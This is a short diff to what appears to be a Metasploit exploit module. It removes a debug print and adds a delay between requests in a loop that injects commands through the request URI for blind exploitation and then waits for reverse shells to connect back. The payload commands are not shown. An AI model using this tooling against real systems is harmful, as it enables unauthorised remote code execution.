@@ -52,7 +52,6 @@
 
         def request(cmd)
               uri = "/"
-              print_status(datastore['URIPATH']+cmd)
               res = send_request_raw({
                 'method'   => 'GET',
                 'uri'      => normalize_uri(uri, '/',datastore['URIPATH']+cmd)
@@ -82,6 +81,7 @@
               print_status("#{rhost}:#{rport} - Blind Exploitation in 3 requests...")
 	      cmds.each do |cmd|
                 request(cmd)
+                sleep(3)
               end
               print_status("#{srvhost}:#{srvport} - Waiting 3 minutes for shells")
               sleep(150)
